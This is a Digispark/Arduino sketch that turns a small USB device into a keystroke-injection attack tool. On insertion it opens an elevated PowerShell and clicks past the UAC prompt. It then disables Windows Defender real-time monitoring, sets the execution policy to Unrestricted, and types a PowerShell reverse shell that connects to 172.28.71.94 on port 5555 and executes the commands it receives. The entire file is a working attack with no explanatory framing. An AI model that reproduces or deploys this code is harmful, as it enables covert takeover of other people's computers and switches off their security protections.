#include "DigiKeyboard.h"
#include <avr/pgmspace.h>
#define KEY_TAB 0x2b

const PROGMEM char str0[]= {"Set-MpPreference -DisableRealtimeMonitoring $true"};
const PROGMEM char str1[]= {"Set-ExecutionPolicy Unrestricted"};
const PROGMEM char str2[]= {"A"};
const PROGMEM char str3[]= {"$sm=(New-Object Net.Sockets.TCPClient(\"172.28.71.94\",5555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}"};
const char *const string_table[] PROGMEM = {str0, str1, str2, str3};
char buffer[300];

void setup() {
  pinMode(1, OUTPUT); //LED on Model A
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(0);
  lauchpowershell();
  desc(0);
  delayit();
  desc(1);
  delayit();
  desc(2);
  delayit();
  desc(3);
}


void loop() {
} 

void desc(int i) {
  strcpy_P(buffer, (char *)pgm_read_word(&(string_table[i])));  // Necessary casts and dereferencing, just copy.
  DigiKeyboard.println(buffer);
}  
void lauchpowershell(){
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("powershell Start-Process powershell -Verb runAs"); 
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  DigiKeyboard.delay(1000);
}
void delayit(){
  DigiKeyboard.delay(500);
}
